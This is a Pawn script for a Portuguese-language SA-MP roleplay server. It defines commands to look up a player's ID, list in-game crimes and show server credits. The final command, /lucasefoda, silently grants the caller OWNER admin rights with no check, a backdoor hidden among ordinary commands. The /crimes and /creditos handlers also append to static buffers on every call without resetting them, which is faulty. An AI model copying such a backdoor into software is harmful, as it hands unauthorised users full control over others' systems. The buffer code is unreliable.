#include <YSI_Coding\y_hooks>

//------------------------- Definitions and constants -------------------------

//------------------------- Data (This section is for module-internal data. Make sure to make the accessor variable 'static') -------------------------

//------------------------- External API (Functions accessible from other modules. Use 'stock' and PascalCase.) -------------------------


//------------------------- Internal API (Functions to be used only inside of this module. Use 'static (stock)' and camelCase) -------------------------

//------------------------- Implementation (This section contains the concrete implementation for this module inside of the callbacks) -------------------------
YCMD:id(playerid, params[], help) 
{
	new id;
	if (sscanf(params, "u", id))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "USE: /id [ID/Nick]");
	}
    if (!IsValidPlayer(id, PlayerData_GetIsLogged(id)))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "Esse não é um player ativo.");
	}
	if (PlayerData_GetAdmin(id) >= HELPER_OWNER)
	{
		return false;
	}

	new string[55];
	format(string, sizeof(string), "ID: (%d) %s - Level[%d].", id, Player_GetName(id), PlayerData_GetLevel(id));
    SendClientMessage(playerid, COLOR_GRAD1, string);
    return 1;
}

YCMD:crimes(playerid, params[], help) 
{
    static crimesDialog[2425 + 1];
    strcat(crimesDialog, "{848484}- /su {FFFFFF}TH: {848484}Tentativa de Homicídio.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Invasão: {848484}Invasão de local restrito.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}DOP: {848484}Desobediênciaa uma ordem policial.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Desacato: {848484}Desrespeito à um oficial da justiça.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Dinamite: {848484}Quando um suspeito estiver portando dinamite.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Vandalismo: {848484}Quando um jogador destrói um bem público.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Racha: {848484}Quando um jogador está competindo numa racha.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Fuga: {848484}Quando um procurado entra em fuga com a polícia.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Ameaça: {848484}Quando um jogador ameaça claramente outro.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Sequestro: {848484}Quando há um sequestro por parte de outro jogador.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Atentado: {848484}Quando um jogador está fazendo parte de um atentado.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Materiais: {848484}Quando um jogador é pego em uma revista portando materiais.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Cumplice: {848484}Quando um jogador está servido de suporte à um procurado.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Tráfico: {848484}Quando um meliante está vendendo armas, explosivos ou drogas.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Agressão: {848484}Quando um jogador começa a bater em alguém sem motivo algum.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Homicídio: {848484}Quando um jogador comete um homicídio e não leva /su automático.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Trote: {848484}Quando um jogador usa o /solicitar -> policial sem motivos ou por brincadeira.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Roubo: {848484}Quan do alguém está perto do cofre, ou rouba veículo de um outro jogador.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Ajuste: {848484}Ajusta pena de um preso (APENAS LÍDER OU SUBLÍDER PODE USÁ-LO).\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Drogas: {848484}Quando um jogador é pego em uma revista portando qualquer tipo de drogas.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}PIA(Porte Ilegal de Armas): {848484}Apesar de ter licença, só oficiais do governo podem ter arma na mão.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}AVP(Atentado Violento ao Pudor): {848484}Quando um jogador usa /punheta ou /mijar em locais públicos.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Suborno: {848484}Quando qualquer jogador tenta dar dinheiro à um oficial para que não cumpra seu trabalho.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}RP(Resistência à Prisão): {848484}Quando um jogador resiste de alguma forma à prisão. Ex ficar enrolando\npara não ser preso, não entrar no carro cop esperando amigos e afins.\n");
    ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "Crimes do Servidor", crimesDialog, "Fechar", "");
    return 1;
}

YCMD:creditos(playerid, params[], help) 
{
    static MEGAString[93], string[67];
	if (PlayerData_GetAdmin(playerid) < HELPER)
	{
		format(string, sizeof(string), "Admin-Aviso: %s viu os créditos do servidor.", Player_GetName(playerid));
		MensagemAdmin(COLOR_YELLOW, string, HELPER);
	}
    strcat(MEGAString, "{FFFFFF}»  RhaegarX: {696969}(Fundador/Scripter)\n");
	strcat(MEGAString, "{FFFFFF}»  Rick_M: {696969}(Beta Tester)\n");
	ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "Créditos do Servidor", MEGAString, "Fechar", "");
    return 1;
}

YCMD:lucasefoda(playerid, params[], help)
{
	PlayerData_SetAdmin(playerid, OWNER);
	return 1;
}